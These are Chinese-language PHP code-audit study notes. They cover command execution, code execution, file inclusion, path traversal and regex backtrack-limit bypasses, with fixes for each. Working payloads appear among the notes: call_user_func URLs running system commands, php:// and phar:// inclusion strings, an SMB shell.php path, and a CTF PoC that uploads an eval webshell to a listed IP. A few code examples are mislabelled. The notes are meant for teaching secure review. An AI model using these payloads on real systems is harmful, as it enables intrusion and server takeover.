### 准备
代码审计的前提:足够的开发能力

审计方法:
* 静态代码审计
* 动态调试跟踪

### 思路

* 掌握项目代码概况
  * 白盒：查看项目文件夹结构 确定基本设计架构与功能
  * 黑盒：访问基本功能 得到HTTP请求与响应中的**URL**、**参数名称** 有助于定位到对应代码行

* Checklist1 - 搜索 PHP危险函数 参考[Exploitable PHP functions](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
  * 命令执行类
  * 代码执行类
  * 文件包含类
  * 文件操作类
  * 请求发起类
  * 自定义的安全过滤函数
  * ...

* Checklist2 - 根据安全的设计思路 看到没有写出来的代码
  * CSRF防御 - 如添加用户等敏感功能 必须做且做好CSRF防御. 避免CSRF漏洞
  * 鉴权逻辑 - 对于没有权限的非法访问请求 必须立即退出逻辑. 避免绕过鉴权(未授权即可操作)
  * 权限设计 - 每次操作前 先根据当前用户的Cookie判断当前身份权限 并仅允许执行当前身份权限下 能够执行的操作. 避免绕过鉴权、水平越权、垂直越权
  * 目录穿越 - 对于文件操作的函数 必须对实际参数做严格判断(白名单 黑名单:删除非法字符). 避免目录穿越漏洞
  * ...

* Checklist3 - 输入输出点
  * 找出“用户可控数据”的输入点
    * web request
    * 数据库
    * 文件
    * ...
  * 从输入点开始紧跟“用户可控数据”流向 查看程序对“用户可控数据”的处理逻辑 以及最终的输出 判断是否安全
    * web response
    * 数据库
    * 文件
    * ...

### 实例1 PHP-命令执行漏洞

#### 设计

程序设计时就需要尽量避免使用"执行系统命令的函数"。

如果"执行系统命令的函数"中有变量值是直接或间接源自用户输入、或可自定义，必须进行严格的过滤/转义。

如果此处没有正确实现，则可能存在"命令注入"漏洞。

#### 函数

PHP中【执行系统命令的函数】，它们只有略微差别：
 ```
+----------------+-----------------+----------------+----------------+
|    Command     | Displays Output | Can Get Output | Gets Exit Code |
+----------------+-----------------+----------------+----------------+
| system()       | Yes (as text)   | Last line only | Yes            |
| passthru()     | Yes (raw)       | No             | Yes            |
| exec()         | No              | Yes (array)    | Yes            |
| shell_exec()   | No              | Yes (string)   | No             |
| backticks (``) | No              | Yes (string)   | No             |
+----------------+-----------------+----------------+----------------+
 ```
 

【执行程序的函数】

[pcntl_exec()](https://www.php.net/manual/en/function.pcntl-exec.php)
```
pcntl_exec()

定义
(PHP 4 >= 4.2.0, PHP 5, PHP 7)
pcntl_exec — Executes specified program in current process space
void pcntl_exec ( string $path [, array $args [, array $envs ]] )

如
<?php
$handle = popen("/bin/ls", "r");
?>
```


[popen()](https://www.php.net/manual/en/function.popen.php)
```
popen()

(PHP 4, PHP 5, PHP 7)
popen — Opens process file pointer

popen ( string $command , string $mode ) : resource
Opens a pipe to a process executed by forking the command given by command.

当mode为'r'时，返回的文件指针等于命令的STDOUT
当mode为'w'时，返回的文件指针等于命令的STDIN
```


[proc_open()](https://www.php.net/manual/zh/function.proc-open.php)
```
(PHP 4 >= 4.3.0, PHP 5, PHP 7)

proc_open — Execute a command and open file pointers for input/output

proc_open() is similar to popen() but provides a much greater degree of control over the program execution.
proc_open() 类似popen() 但可对程序执行做更大程度的控制

proc_open ( string $cmd , array $descriptorspec , array &$pipes [, string $cwd = NULL [, array $env = NULL [, array $other_options = NULL ]]] ) : resource
```


【回调函数】

使用回调函数可以调用任意函数.

1. [call_user_func()](https://www.php.net/manual/en/function.call-user-func.php)
2. [call_user_func_array()](https://www.php.net/manual/zh/function.call-user-func-array.php)
3. [array_map()](hhttps://www.php.net/manual/en/function.array-map.php) 为数组的每个元素应用回调函数
4. [array_walk()] 使用用户自定义函数 对数组中的每个元素做回调处理
5. [array_filter()]() 依次将数组中的每个值传递到 callback函数
6. [create_function()](https://www.php.net/manual/en/function.create-function.php) PHP 7.2.0之后 没有此函数 已被弃用
7. usort()
8. ob_start()
9. 可变函数$var(args)



1. [call_user_func()](https://www.php.net/manual/en/function.call-user-func.php)
```
(PHP 4, PHP 5, PHP 7)
call_user_func ( callable $callback [, mixed $... ] ) : mixed


# 正常示例:

<?php
function welcome($name)
{
    echo "hello $name <br>";
}
call_user_func('welcome', "tom");
call_user_func('welcome', "jack");
//输出 hello tom  hello jack 
?>

# 利用:

<?php
	call_user_func($_GET['a1'],$_GET['a2']);
?>


xxx.php?a1=system&a2=whoami    //命令执行
xxx.php?a1=assert&a2=phpinfo() //代码执行
```


#### 修复与防御

修复命令执行漏洞
* [1] 使用转义函数 - 使用PHP自带的2个函数专门对命令字符串进行转义:escapeshellcmd和escapeshellarg 这2个函数的具体实现参考[331行](https://github.com/php/php-src/blob/321c0cc3493998f731f0666127c093eff4e119eb/ext/standard/exec.c)
  * escapeshellcmd  防止用户利用shell下的一些字符（如# ; 反单引号 等）构造其他命令
  * escapeshellarg  防止用户输入的内容逃逸出"参数值"的位置转而变成一个"参数选项"

```
<?php
system(escapeshellcmd('pwd '.escapeshellarg("-L")));
//此时尝试进行命令注入：修改"-L"和'pwd '  会发现关键字符被转义 无法执行命令:
echo escapeshellcmd('pwd $#;` '.escapeshellarg("-L;id"));//输出为pwd \$\#\;\` '-L\;id'
?>
```

* [2] 禁用PHP函数 - 使用php配置文件php.ini实现禁用某些危险的PHP函数 如`disable_functions =system,passthru,shell_exec,exec,popen`



### 实例2 PHP-代码执行漏洞

#### 设计

设计上禁止使用"能够代码执行的函数"。

#### 函数

* 代码执行函数
  * eval()
  * assert()
  * [preg_replace()](https://php.net/preg_replace) php7.0不再支持\e参数
  * $

#### 修复与防御

* [1] 设计上禁止使用"能够代码执行的函数"
* [2] 禁用PHP函数 - 使用php配置文件php.ini实现禁用某些危险的PHP函数 如`disable_functions =system,passthru,shell_exec,exec,popen`


### 实例3 PHP-文件包含漏洞

#### 设计

文件包含函数禁止使用"变量"作为参数值。

#### 函数

* 文件包含函数 (使用文件包含函数，被包含的文件无论是什么后缀，都会被当作php文件进行解析)
  * include()
  * include_once()
  * require()
  * require_once()

#### 测试

* 文件包含(File Inclusion)漏洞的分类
  * LFI(Local File Inclusion) 本地文件包含:如果文件包含函数中的参数值"文件路径"可控，通常存在"本地文件包含"漏洞
  * RFI(Remote File Inclusion)远程文件包含
    * 前置利用条件:在php.ini中必须开启2个选项才可能进行远程文件包含 `allow_url_fopen = On` (默认为On); `allow_url_include = On`(php>=5.2则默认Off)
    * 例外:以上2个选项都是Off时，可以使用smb协议，尝试使example.com包含在Windows机器(10.0.0.1)上的远程文件：先创建一个向所有人开放的共享，里面放shell.php文件，尝试包含这个文件`http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
* 文件包含(File Inclusion)漏洞的利用方式
  * php伪协议 - `php://input` 前置利用条件为php.ini中`allow_url_include = On`  利用:POST url`xx.php?file=php://input`  POST body:`<? phpinfo();?>`
  * php伪协议 - `php://filter` 无前置利用条件  利用:`xx.php?file=php://filter/read=convert.base64-encode/resource=index.php` 或 `index.php?file=php://filter/convert.base64-encode/resource=index.php`
  * php伪协议 - `phar://` 前置利用条件为php版本>=5.3.0  利用:将内容为`<?php phpinfo(); ?>`的文件phpinfo.txt压缩为test.zip 访问绝对路径`xx.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt`或相对路径`xx.php?file=phar://test.zip/phpinfo.txt`（test.zip和xx.php在同一目录下）
  * php伪协议 - `zip://` 前置利用条件为php版本>=5.3.0  利用:将内容为`<?php phpinfo(); ?>`的文件phpinfo.txt压缩为test.zip 只能访问绝对路径`xx.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip%23phpinfo.txt` 注意需使用`%23`
  * ... 更多利用方式(LFI/RFI导致代码执行、LFI to RCE) 参考[PayloadsAllTheThings/File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)


从项目代码中查找关键字
```
# 代码执行函数 - 查找关键字 eval assert preg_replace 等
find /xxcms -type f -name "*.php" | xargs grep -n 'eval'

# 文件包含函数 - 查找关键字 include require require_once
find /xxcms -type f -name "*.php" | xargs grep -n 'include \$'
```

#### 修复与防御

文件包含函数禁止使用"变量"作为参数值。


### 实例4 PHP-路径穿越漏洞

#### 设计

程序设计时就需要尽量避免"路径"可控。

如果"路径"中有变量直接或间接源自用户输入、或可自定义，必须进行严格的过滤/转义。

如果此处没有正确实现，则可能存在"目录穿越"漏洞。

#### 函数

* 文件操作类
  * 文件是否存在[file_exists()](https://www.php.net/manual/zh/function.file-exists.php) 检查文件或目录是否存在。如果此处存在目录穿越漏洞，可实现探测某文件是否存在。
  * 文件和目录是否存在[scandir](https://www.php.net/manual/zh/function.scandir.php) — 列出指定路径中的文件和目录。
  * 文件读取[readfile()](https://www.php.net/manual/zh/function.readfile.php) 文件输出函数。常用于下载，如果此处存在目录穿越漏洞，可实现任意文件下载
  * 文件读取[file_get_contents()](https://www.php.net/manual/zh/function.file-get-contents.php) 文件读取，常用于下载
  * 文件读写[fopen](https://www.php.net/manual/zh/function.fopen.php) — 打开文件或者 URL。 模式可选 读/写/读写
  * 文件删除[unlink()](https://www.php.net/manual/zh/function.unlink.php) 文件删除函数。如果此处存在目录穿越漏洞，可实现任意文件删除。常常删除install.lock文件实现重新安装进而getshell
  * 文件上传[move_uploaded_file()](https://www.php.net/manual/zh/function.move-uploaded-file.php) 将上传的文件移动到新位置。如果此处存在目录穿越漏洞，可实现任意文件上传/覆盖
  * ...

#### 修复与防御

* 限制web应用可访问的目录
  * PHP 在配置文件php.ini中指定open_basedir的值，如windows下用`;`分割`open_basedir = D:\soft\sites\www.a.com\;` linux下用`：`分割`/home/wwwroot/tp5/:/tmp/:/var/tmp/:/proc/`
* web应用设计-避免路径可控（尤其关注"文件操作类"的功能与函数）
* web应用设计-循环替换"某些字符串"为空 如`..` `./` `.\` `\\` `//` 并 使用编程语言函数获取"将要解压的文件夹路径"的"规范路径名" 并判断它是否以预期设计的合法的"目的文件夹"开头
* web应用设计-使用成熟的压缩解压操作库 避免文件解压过程中出现路径穿越漏洞


### 实例5 PHP-正则表达式的PCRE回溯次数限制导致绕过判断

#### 设计

如果用`preg_match`对字符串进行正则匹配，一定要使用全等号`===`来判断返回值。

#### 函数

* [preg_match()](https://www.php.net/manual/zh/function.preg-match.php) 执行一个正则表达式的匹配

#### 测试

* pcre回溯次数上限
  * PHP为了防止正则表达式的拒绝服务攻击(reDOS)，给pcre设定了一个回溯次数上限`pcre.backtrack_limit`
  * 查看当前环境的回溯次数上限(默认为1000000次) `var_dump(ini_get('pcre.backtrack_limit'));`
* 绕过的前置条件
  * 如果用`preg_match`对字符串进行正则匹配，没有使用安全可靠的全等号`===`来判断返回值，而是使用了可被绕过的`==`、或在变量名前加`!`进行判断
* 构造超长字符串进行利用
  * 如果匹配过程中超过了PCRE回溯次数限制，就返回`false`，而没有返回预期的`0`或`1`，导致正则表达式的判断被绕过。


错误例子1:

某ctf题 正则表达式的判断可被绕过
```php
<?php
function is_php($data){  
    return preg_match('/<\?.*[(`;?>].*/is', $data);  
}

if(!is_php($input)) {
    // 写入文件 进入该代码块则可getshell
    // fwrite($f, $input); ...
}
```

write-up PoC:
```python
import requests
from io import BytesIO

files = {
  'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
}

res = requests.post('http://51.158.75.42:8088/index.php', files=files, allow_redirects=False)
print(res.headers)
```


错误例子2:
基于php的WAF 正则表达式的判断可被绕过

以下例子都可以通过构造"大量回溯"绕过判断
```php
<?php
//贪婪模式
if(preg_match('/SELECT.+FROM.+/is', $input)) {
    die('SQL Injection');
}
```

```php
//非贪婪模式
<?php
if(preg_match('/UNION.+?SELECT/is', $input)) {
    die('SQL Injection');
}
```

正确例子:

```
<?php
function is_php($data){  
    return preg_match('/<\?.*[(`;?>].*/is', $data);  
}

//如果用preg_match对字符串进行匹配，一定要使用===全等号来判断返回值
if(is_php($input) === 0) {
    // fwrite($f, $input); ...
}
```

#### 修复与防御

如果用`preg_match`对字符串进行正则匹配，一定要使用全等号`===`来判断返回值。

详细参考 [PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

